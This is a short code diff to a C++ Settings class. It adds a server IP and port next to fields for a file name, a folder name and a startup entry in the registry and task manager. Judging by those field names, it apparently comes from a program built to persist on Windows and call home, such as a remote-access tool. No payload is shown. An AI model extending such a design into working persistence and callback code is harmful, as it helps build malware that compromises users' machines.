@@ -11,6 +11,9 @@
 class Settings
 {
 public:
+	static std::string serverIP;
+	static int serverPort;
+
 	static std::string fileName;		//file name
 	static std::string folderName;	//folder name
 	static std::string startupName;		//startup name in registry / taskmgr
